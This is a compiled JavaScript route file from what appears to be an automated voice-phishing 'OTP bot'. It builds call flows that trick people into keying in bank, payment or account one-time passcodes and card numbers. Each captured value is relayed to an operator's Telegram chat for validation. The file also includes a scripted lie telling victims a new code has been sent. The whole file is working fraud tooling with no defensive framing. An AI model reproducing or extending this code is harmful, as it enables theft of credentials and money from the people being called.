"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("../..");
const __2 = require("../");
const telegraf_1 = require("telegraf");
const uuid_1 = require("uuid");
const languages_1 = require("../../languages");
__2.app.all('/calls/otp/:step/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { askCardInfo, cardType, variables, otpLength } = req.query;
    const { language, chatId, step } = req.params;
    const { dtmf } = JSON.parse(variables);
    if (dtmf && dtmf === '*') {
        yield __1.bot.telegram.sendMessage(chatId, `Kindly resend OTP NOW ❌`);
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call ${step} - ${chatId} no OTP`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: 'OKAY, KINDLY HOLD ON While we send YOU a new OTP CODE. WAIT!.  OKAY! We just sent you a new OTP CODE, Kindly input the OTP followed by the Pounds key.',
                        language,
                        voice: 'female',
                    },
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'customStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'customStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
    switch (step) {
        case 'bank':
            if (!dtmf) {
                return res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call ${step} - ${chatId} OTP`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangOTP)({
                                    sp: `1`,
                                    step: `bank`,
                                    language: language,
                                }),
                                language,
                                voice: 'female',
                                loop: true,
                            },
                            onKeypressGoto: 'nextStepOTP',
                            endKey: '#',
                            maxNumKeys: Number(otpLength),
                            onKeypressVar: 'dtmf',
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepOTP',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: Number(otpLength),
                        },
                        {
                            id: 'nextStepOTP',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                            },
                        },
                    ],
                });
            }
            if (dtmf) {
                if (dtmf.length !== Number(otpLength)) {
                    return res.json({
                        id: (0, uuid_1.v4)(),
                        title: `call ${step} - ${chatId} OTP`,
                        record: false,
                        steps: [
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'say',
                                options: {
                                    payload: (0, languages_1.getLangOTP)({
                                        sp: `1`,
                                        step: `shared`,
                                        language: language,
                                        dtmf: dtmf.split('').join(', '),
                                    }),
                                    language,
                                    voice: 'female',
                                    loop: true,
                                },
                                onKeypressGoto: 'nextStepOTP',
                                endKey: '#',
                                maxNumKeys: Number(otpLength),
                                onKeypressVar: 'dtmf',
                            },
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'pause',
                                options: {
                                    length: 5,
                                },
                                onKeypressGoto: 'nextStepOTP',
                                onKeypressVar: 'dtmf',
                                endKey: '#',
                                maxNumKeys: Number(otpLength),
                            },
                            {
                                id: 'nextStepOTP',
                                action: 'fetchCallFlow',
                                options: {
                                    url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                                },
                            },
                        ],
                    });
                }
                yield __1.bot.telegram.sendMessage(req.params.chatId, `OTP is <b>${dtmf}</b> ✅`, {
                    parse_mode: 'HTML',
                    reply_markup: telegraf_1.Markup.inlineKeyboard([
                        telegraf_1.Markup.button.callback('❤️ Valid', 'valid'),
                        telegraf_1.Markup.button.callback('💔 Invalid', 'invalid'),
                    ]).reply_markup,
                });
            }
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call bank - ${chatId} OTP`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangOTP)({
                                sp: `2`,
                                step: `bank`,
                                language: language,
                                dtmf: dtmf.split('').join(', '),
                            }),
                            language,
                            voice: 'female',
                        },
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/verify_input/${step}/${language}/${chatId}/${1}?otpLength=${otpLength}`,
                        },
                    },
                ],
            });
        case 'pay':
            if (!dtmf) {
                return res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call ${step} - ${chatId} OTP`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangOTP)({
                                    sp: `1`,
                                    step: `pay`,
                                    language: language,
                                }),
                                language,
                                voice: 'female',
                                loop: true,
                            },
                            onKeypressGoto: 'nextStepOTP',
                            endKey: '#',
                            maxNumKeys: Number(otpLength),
                            onKeypressVar: 'dtmf',
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepOTP',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: Number(otpLength),
                        },
                        {
                            id: 'nextStepOTP',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                            },
                        },
                    ],
                });
            }
            if (dtmf) {
                if (dtmf.length !== Number(otpLength)) {
                    return res.json({
                        id: (0, uuid_1.v4)(),
                        title: `call ${step} - ${chatId} OTP`,
                        record: false,
                        steps: [
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'say',
                                options: {
                                    payload: (0, languages_1.getLangOTP)({
                                        sp: `1`,
                                        step: `shared`,
                                        language: language,
                                    }),
                                    language,
                                    voice: 'female',
                                    loop: true,
                                },
                                onKeypressGoto: 'nextStepOTP',
                                endKey: '#',
                                maxNumKeys: Number(otpLength),
                                onKeypressVar: 'dtmf',
                            },
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'pause',
                                options: {
                                    length: 5,
                                },
                                onKeypressGoto: 'nextStepOTP',
                                onKeypressVar: 'dtmf',
                                endKey: '#',
                                maxNumKeys: Number(otpLength),
                            },
                            {
                                id: 'nextStepOTP',
                                action: 'fetchCallFlow',
                                options: {
                                    url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                                },
                            },
                        ],
                    });
                }
                yield __1.bot.telegram.sendMessage(req.params.chatId, `OTP is <b>${dtmf}</b> ✅`, {
                    parse_mode: 'HTML',
                    reply_markup: telegraf_1.Markup.inlineKeyboard([
                        telegraf_1.Markup.button.callback('❤️ Valid', 'valid'),
                        telegraf_1.Markup.button.callback('💔 Invalid', 'invalid'),
                    ]).reply_markup,
                });
            }
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call bank - ${chatId} OTP`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangOTP)({
                                sp: `1`,
                                step: `pay`,
                                language: language,
                                dtmf: dtmf.split('').join(', '),
                            }),
                            language,
                            voice: 'female',
                        },
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/verify_input/${step}/${language}/${chatId}/${1}?otpLength=${otpLength}`,
                        },
                    },
                ],
            });
        case 'account':
            if (!dtmf) {
                return res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call ${step} - ${chatId} OTP`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangOTP)({
                                    sp: `1`,
                                    step: `account`,
                                    language: language,
                                }),
                                language,
                                voice: 'female',
                                loop: true,
                            },
                            onKeypressGoto: 'nextStepOTP',
                            endKey: '#',
                            maxNumKeys: Number(otpLength),
                            onKeypressVar: 'dtmf',
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepOTP',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: Number(otpLength),
                        },
                        {
                            id: 'nextStepOTP',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                            },
                        },
                    ],
                });
            }
            if (dtmf) {
                if (dtmf.length !== Number(otpLength)) {
                    return res.json({
                        id: (0, uuid_1.v4)(),
                        title: `call ${step} - ${chatId} OTP`,
                        record: false,
                        steps: [
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'say',
                                options: {
                                    payload: (0, languages_1.getLangOTP)({
                                        sp: `1`,
                                        step: `shared`,
                                        language: language,
                                    }),
                                    language,
                                    voice: 'female',
                                    loop: true,
                                },
                                onKeypressGoto: 'nextStepOTP',
                                endKey: '#',
                                maxNumKeys: Number(otpLength),
                                onKeypressVar: 'dtmf',
                            },
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'pause',
                                options: {
                                    length: 5,
                                },
                                onKeypressGoto: 'nextStepOTP',
                                onKeypressVar: 'dtmf',
                                endKey: '#',
                                maxNumKeys: Number(otpLength),
                            },
                            {
                                id: 'nextStepOTP',
                                action: 'fetchCallFlow',
                                options: {
                                    url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                                },
                            },
                        ],
                    });
                }
                yield __1.bot.telegram.sendMessage(req.params.chatId, `OTP is <b>${dtmf}</b> ✅`, {
                    parse_mode: 'HTML',
                    reply_markup: telegraf_1.Markup.inlineKeyboard([
                        telegraf_1.Markup.button.callback('❤️ Valid', 'valid'),
                        telegraf_1.Markup.button.callback('💔 Invalid', 'invalid'),
                    ]).reply_markup,
                });
            }
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call bank - ${chatId} OTP`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangOTP)({
                                sp: `1`,
                                step: `account`,
                                language: language,
                                dtmf: dtmf.split('').join(', '),
                            }),
                            language,
                            voice: 'female',
                        },
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/verify_input/${step}/${language}/${chatId}/${1}?askCardInfo=${askCardInfo}&cardType=${cardType}?otpLength=${otpLength}`,
                        },
                    },
                ],
            });
        case 'card':
            if (!dtmf) {
                return res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call ${step} - ${chatId} CARD`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangOTP)({
                                    sp: `1`,
                                    step: `card`,
                                    language: language,
                                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                }),
                                language,
                                voice: 'female',
                                loop: true,
                            },
                            onKeypressGoto: 'nextStepCard',
                            endKey: '#',
                            maxNumKeys: 18,
                            onKeypressVar: 'dtmf',
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepCard',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 18,
                        },
                        {
                            id: 'nextStepCard',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                            },
                        },
                    ],
                });
            }
            if (!(dtmf.length > 14 && dtmf.length < 17)) {
                return res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call ${step} - ${chatId} CARD`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangOTP)({
                                    sp: `2`,
                                    step: `card`,
                                    language: language,
                                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                }),
                                language,
                                voice: 'female',
                                loop: true,
                            },
                            onKeypressGoto: 'nextStepCard',
                            endKey: '#',
                            maxNumKeys: 18,
                            onKeypressVar: 'dtmf',
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepCard',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 18,
                        },
                        {
                            id: 'nextStepCard',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                            },
                        },
                    ],
                });
            }
            if (dtmf) {
                yield __1.bot.telegram.sendMessage(req.params.chatId, `Card number <b>${dtmf}</b> ✅`, {
                    parse_mode: 'HTML',
                });
                return res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call ${step} - ${chatId} CARD`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangOTP)({
                                    sp: `3`,
                                    step: `card`,
                                    language: language,
                                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                    dtmf: dtmf.split('').join(', '),
                                }),
                                language,
                                voice: 'female',
                                loop: true,
                            },
                            onKeypressGoto: 'nextStepCard',
                            endKey: '#',
                            maxNumKeys: 18,
                            onKeypressVar: 'dtmf',
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepCard',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 18,
                        },
                        {
                            id: 'nextStepCard',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
                            },
                        },
                    ],
                });
            }
            else {
                return res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call ${step} - ${chatId} CARD`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangOTP)({
                                    sp: `4`,
                                    step: `card`,
                                    language: language,
                                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                }),
                                language,
                                voice: 'female',
                                loop: true,
                            },
                            onKeypressGoto: 'nextStepCard',
                            endKey: '#',
                            maxNumKeys: 18,
                            onKeypressVar: 'dtmf',
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepCard',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 18,
                        },
                        {
                            id: 'nextStepCard',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                            },
                        },
                    ],
                });
            }
        default:
            break;
    }
}));
